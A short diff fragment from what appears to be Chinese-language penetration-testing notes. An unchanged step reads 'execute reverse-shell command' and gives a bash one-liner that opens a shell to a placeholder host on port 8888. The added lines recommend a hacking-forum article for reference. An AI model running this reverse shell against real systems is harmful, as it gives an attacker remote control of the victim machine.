@@ -34,3 +34,5 @@
   
   3.执行反弹命令bash -i >& /dev/tcp/xxxxxx/8888 0>&1
   
+有个文章不错可以参考：https://forum.ywhack.com/thread-200939-1-7.html
+  
